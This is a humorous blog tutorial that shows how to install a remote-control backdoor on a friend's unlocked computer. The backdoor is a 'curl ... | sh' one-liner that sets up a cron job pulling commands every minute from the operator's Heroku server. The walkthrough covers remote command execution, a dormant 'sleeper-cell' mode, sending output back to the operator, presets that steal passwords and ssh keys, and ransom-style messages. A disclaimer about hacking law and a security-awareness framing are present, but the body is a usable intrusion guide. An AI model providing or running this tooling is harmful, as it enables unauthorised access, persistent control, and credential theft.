---
title: How to hack your friends
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2016-07-27T18:46:15.000Z'
originalURL: https://freecodecamp.org/news/how-to-hack-your-friends-eef055389344
coverImage: https://cdn-media-1.freecodecamp.org/images/1*CRdFzUjOuDE-qB0ASTk9yQ.jpeg
tags:
- name: humor
  slug: humor
- name: General Programming
  slug: programming
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: technology
  slug: technology
seo_title: null
seo_desc: 'By Chet Corcos

  My friends often leave their computers open and unlocked. I tell them they should
  probably get in the habit of locking their computers, but they don’t listen to me.
  So I’ve created a simple project to hack my friends and show them the ...'
---

By Chet Corcos

My friends often leave their computers open and unlocked. I tell them they should probably get in the habit of locking their computers, but they don’t listen to me. So I’ve created a simple project to hack my friends and show them the importance of computer security.

All I need to do is wait for them to leave their computer unlocked for a few seconds, open up their terminal, and type a single, short command.

![Image](https://cdn-media-1.freecodecamp.org/images/m6THEYS8NfQbc3nmrt1d9xWavmQ0t5UqR7L0)

That’s it! Their computer is now infected and I can run whatever commands I want on this computer remotely. Pretty sweet, right? Or perhaps shocking?

Hacking is illegal. Specifically:

> “intentionally access[ing] a computer without authorization or exceed[ing] authorized access” — The Computer Fraud and Abuse Act (18 U.S.C. 1030)

So keep in mind that the purpose of this article is to show you just how easy it would be for someone with bad intentions to hack you so you can avoid getting hacked yourself.

It doesn’t take some hacker genius to wreck your life — any “script kiddy” who can gain physical access to your computer can compromise you by downloading a script containing just 50 lines of code.

### Getting Setup

All of the code for this project lives in [this repository](https://github.com/ccorcos/hack/) if you want to jump right in, but I’ll explain how it all works below.

First, you just need to clone the repo, install its dependencies, and symlink the _hack_ command line interface (CLI) tool.

```
git clone https://github.com/ccorcos/hack.gitgit remote remove origincd hacknpm installnpm link
```

Next, you need to setup Heroku to host the scripts that will be running on your friends machine. If you’ve never used Heroku before, [signup here](https://signup.heroku.com/) (it’s free!) and set up their CLI tool on your machine.

```
brew install heroku-toolbeltheroku login
```

Now inside the _hack_ repo, create a Heroku app with an easy name to remember. I’m using _hacker-chet._

```
heroku create hacker-chet
```

Then you need to run a command to do a little setup. All it’s really doing is getting the root url for your Heroku website and putting it in your _package.json_. This way the server can inject the app url into the shell scripts.

```
npm run init
```

You can start up the server locally if you want to hack yourself and test things out.

```
npm start
```

Or you can deploy to Heroku.

```
npm run deploy
```

Now you’re ready to hack!

### Hack API

The beauty of this program is that to start hacking someone, you just need to run a single command on their machine.

```
curl <ROOT_URL>/hack | sh
```

_ROOT_URL_ is the specific path to your application. When you’re running the server locally, this will be _localhost:5000_ and when you deploy to Heroku, it will be something like _<APP_NAME>.herokua_pp.com.

What this does is sets up a cron job — a “chronological job” that reruns tasks at certain times — to ping the _/env/live_ endpoint every minute and pipes the result to _sh_. It’s actually quite simple! And Heroku gives you HTTPS for free so its “secure” right?

Once you’ve hacked your friend, you can do everything else with the command line tool from your computer.

The _hack_ tool has a concept of different hacked environments. When you hack someone using the _/hack_ endpoint, that person starts off in the _live_ environment. And for each environment, you can run a variety of different commands. I’ll demonstrate everything with a little walkthrough.

The following will rewrite the _live_ environment shell script to execute the following command which will say aloud “I’m watching you.”

```
hack live exec "say 'I\'m watching you'"
```

Well it’s not going to work yet, you still have to re-deploy to your Heroku app.

```
hack deploy
```

![Image](https://cdn-media-1.freecodecamp.org/images/lZCEVaEwYojBREkv0FYXOep2WSuzeUFsc7No)

Now wait for the next minute and watch your friend’s computer ping your server by tailing the server logs.

```
hack logs
```

![Image](https://cdn-media-1.freecodecamp.org/images/c9QH5cbuC67pKigu-Tb2k18Yxhlibrhj2usu)

The whole point of environments is so you can hack multiple people at the same time. To isolate people in different environments, you just need to change the name.

```
hack live rename jon
```

Next time the live environment is pinged, it will rewrite the cron job to start pinging the _jon_ environment instead.

![Image](https://cdn-media-1.freecodecamp.org/images/ocaA9PDrheoOnZd3tgUSjMyuNHGsSFMBBdWn)

You can do everything the same just by changing the environment argument.

```
hack jon exec "say 'hello jon'"
```

Now if you’ve had enough fun for the day and the party’s over, you can _forget_ Jon and assure him that you’ve “unhacked” him.

```
hack jon forget
```

This will erase the cron job from their computer. Or you might want to just put this environment in sleeper-cell mode so you can recover it later.

```
hack jon interval 1d
```

Now, rather than pinging your server every minute (the default), it will ping every day at midnight. And when you want to wake it back up, you can change the interval back to every minute and the next day, you’re good to go!

```
hack jon interval 1m
```

Some other fun things to do are setting up additional cron jobs. Here’s how you can wake your friend up at 6am every morning to remind him about computer security.

```
hack jon cron "0 6 * * * say 'good morning jon, remember what I told you about locking your computer?'"
```

P.S. If you don’t remember how cron jobs work, [this is a great resource](http://www.nncron.ru/help/EN/working/cron-format.htm). It pretty much all comes down to this little diagram.

```
* * * * *| | | | || | | | || | | | +---- Day of the Week   (range: 1-7, 1 standing for Monday)| | | +------ Month of the Year (range: 1-12)| | +-------- Day of the Month  (range: 1-31)| +---------- Hour              (range: 0-23)+------------ Minute            (range: 0-59)
```

One of my favorites is the _desktop_ preset which will download an image from a given URL and set it as the background photo.

```
hack jon preset desktop http://i.imgur.com/5FC2r9R.jpg
```

And if you’ve written a ton of cron jobs and you don’t know what’s on there anymore, you can use the dump command.

```
hack jon dump "crontab -l"
```

Now whip open your logs and you’ll see the output on the next ping. This is actually much more sinister now that you can get information back. If you wanted to be more nefarious, you can search for decrypted passwords or steal their ssh keys.

```
hack jon preset passwordshack jon preset ssh
```

But if you just want to give him a good old-fashioned scare, send him a ransom message!

```
hack jon preset ransom "Hello Jon, I told you not to leave your computer unlocked."
```

![Image](https://cdn-media-1.freecodecamp.org/images/4XvzBEX8686IJ-ZNhlNjyrVIDIGKEY-SOhtK)

Lastly, if you find yourself adding a bunch of cron jobs and just want to start over, reset is here to help.

```
hack jon reset
```

Now go have (responsible) fun with this thing and let me know what your favorite pranks are by [submitting a pull request](https://github.com/ccorcos/hack) with a new command or preset!

Happy Hacking!

